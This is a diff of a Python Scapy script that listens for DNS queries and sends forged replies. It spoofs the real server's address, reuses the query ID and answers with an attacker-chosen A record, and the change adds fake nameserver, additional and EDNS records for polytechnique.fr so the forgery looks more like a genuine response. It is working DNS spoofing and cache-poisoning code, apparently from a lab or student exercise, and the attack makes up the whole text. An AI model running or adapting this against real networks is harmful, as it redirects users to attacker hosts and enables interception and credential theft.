@@ -36,12 +36,25 @@ def maFonction(a):
         d.ns = DNSRR(rrname = DOMAIN, type = "NS", ttl = 86400, rdata = "radius.polytechnique.fr")
         d.ar = DNSRR(rrname = "radius.polytechnique.fr", type = "A", ttl = 86400, rdata = ip_autorite)
         sendp(spoofed, iface_hint=src)"""
-        spoofed_pkt = IP(dst=a[IP].src, src=a[IP].dst)/\
+        spoofed_pkt = IP(dst=a[IP].src, src=a[IP].dst, id=63290)/\
                       UDP(dport=a[UDP].sport, sport=a[UDP].dport)/\
                       DNS(id=a[DNS].id, qd=a[DNS].qd, aa = 0L, qr=1L, ra = 1L, \
                       an = DNSRR(rrname=a[DNS].qd.qname,type='A',rclass='IN', ttl=23942, rdata='129.104.221.35'), \
-                      ar = DNSRR(rrname = "rackham.polytechnique.fr", type = "A", ttl = 86400, rdata = '129.104.32.41'), \
-                      ns = DNSRR(rrname = "polytechnique.fr", type = "NS", ttl = 86400, rdata = "rackham.polytechnique.fr"))
+                      arcount=8, \
+                      ar = DNSRR(rrname = "ns2.nic.fr", type = "A", ttl = 105036, rdata = '192.93.0.4')/ \
+                      DNSRR(rrname = "ns2.nic.fr", type = "AAAA", ttl = 134430, rdata = '2001:660:3005:1::1:2')/ \
+                      DNSRR(rrname = "milou.polytechnique.fr", type = "A", ttl = 86400, rdata = '129.104.30.41')/ \
+                      DNSRR(rrname = "milou.polytechnique.fr", type = "AAAA", ttl = 86400, rdata = '2001:660:3026:1:0:30:30:41')/ \
+                      DNSRR(rrname = "picaros.polytechnique.fr", type = "A", ttl = 86400, rdata = '129.104.7.41')/ \
+                      DNSRR(rrname = "picaros.polytechnique.fr", type = "AAAA", ttl = 86400, rdata = '2001:660:3026::7:7:41')/ \
+                      DNSRR(rrname = "rackham.polytechnique.fr", type = "A", ttl = 86400, rdata = '129.104.32.41')/ \
+                      DNSRR(rrname = "rackham.polytechnique.fr", type = "AAAA", ttl = 86400, rdata = '2001:660:3026::32:32:41')/ \
+                      DNSRR(rrname='.',type=41,rclass=4096,ttl=0,rdata=''), \
+                      nscount=4, \
+                      ns = DNSRR(rrname = "polytechnique.fr", type = "NS", ttl = 86400, rdata = "rackham.polytechnique.fr")/ \
+                      DNSRR(rrname = "polytechnique.fr", type = "NS", ttl = 86400, rdata = "picaros.polytechnique.fr")/ \
+                      DNSRR(rrname = "polytechnique.fr", type = "NS", ttl = 86400, rdata = "milou.polytechnique.fr")/ \
+                      DNSRR(rrname = "polytechnique.fr", type = "NS", ttl = 86400, rdata = "ns2.nic.fr"))
         send(spoofed_pkt)
 
     if (a[DNS].qr==1L) and ((a[IP].src == filtre) or (a[IP].dst == filtre) or (filtre == '-a')) and (a[DNS].ancount>0):
